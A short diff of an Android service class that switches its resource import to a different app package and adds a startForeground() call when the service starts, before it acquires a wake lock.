@@ -16,7 +16,7 @@ import android.os.PowerManager;
 import android.os.SystemClock;
 import android.util.Log;
 import androidx.core.app.NotificationCompat;
-import com.fason.app.R;
+import com.spork.app.R;
 import com.fason.app.core.Protocol;
 import com.fason.app.core.network.SocketClient;
 import com.fason.app.core.network.SocketCommandRouter;
@@ -235,6 +235,7 @@ public class MainService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        startForeground();
         if (wakeLock != null && !wakeLock.isHeld()) {
             wakeLock.acquire(WAKE_LOCK_TIMEOUT_MS);
         }
